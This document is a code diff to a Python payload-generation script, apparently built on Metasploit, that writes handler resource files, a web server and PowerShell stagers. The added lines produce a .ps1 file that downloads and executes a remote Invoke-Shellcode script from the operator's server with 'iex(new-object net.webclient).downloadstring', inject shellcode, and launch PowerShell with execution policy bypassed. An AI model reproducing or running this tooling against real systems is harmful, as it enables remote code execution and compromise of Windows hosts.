@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-# To install on 64bit Ubuntu/Debian:
+# To install on 64bit Ubuntu/Debian/Kali:
 #   dpkg --add-architecture i386
 #   apt-get update
 #   apt-get install wine32
@@ -65,8 +65,9 @@ WINE_DIR = '{}/wine'.format(SCRIPT_DIR)
 
 
 def make_executable(f):
-    st = os.stat(f)
-    os.chmod(f, st.st_mode | stat.S_IEXEC)
+    fname = '{}/{}'.format(SCRIPT_DIR, f)
+    st = os.stat(fname)
+    os.chmod(fname, st.st_mode | stat.S_IEXEC)
 
 
 def add_handler(payload, server, port):
@@ -207,16 +208,20 @@ for p in PAYLOADS:
     elif p['format'] == 'ps1':
         tmp_file = '{}/{}.{}'.format(SCRIPT_DIR, p['filename'], p['format'])
         buf = open(tmp_file).read()
+        os.remove(tmp_file)
+
         buf = buf.replace("\n", ",")
         buf = buf.replace("$buf += ", "")
         buf = buf.replace("[Byte[]] $buf = ", "")
         buf = buf.rstrip(',')
         txt = "# {}\n".format(p['payload'])
-        txt += "%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n"
-        txt += "iex(new-object net.webclient).downloadstring('http://{}:{}/invsc.ps1')\n".format(SERVER, WEBSERVER_PORT)
-        txt += "Invoke-Shellcode -Shellcode @({})\n".format(buf)
+        txt += "%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File {}.ps1\n".format(p['filename'])
+
+        ps1 = "iex(new-object net.webclient).downloadstring('http://{}:{}/invsc.ps1')\n".format(SERVER, WEBSERVER_PORT)
+        ps1 += "Invoke-Shellcode -Shellcode @({})\n".format(buf)
+
         write_text_file('{}.txt'.format(p['filename']), txt)
-        os.remove(tmp_file)
+        write_text_file('{}.ps1'.format(p['filename']), ps1)
 
 print("Adding additional handlers ...")
 for h in ADDITIONAL_HANDLERS:
@@ -240,6 +245,7 @@ print()
 
 write_text_file('handler.rc', handler)
 write_text_file('webserver.py', WEBSERVER)
+make_executable('webserver.py')
 write_text_file('commands.txt', commands)
 
 print("Cleanup")
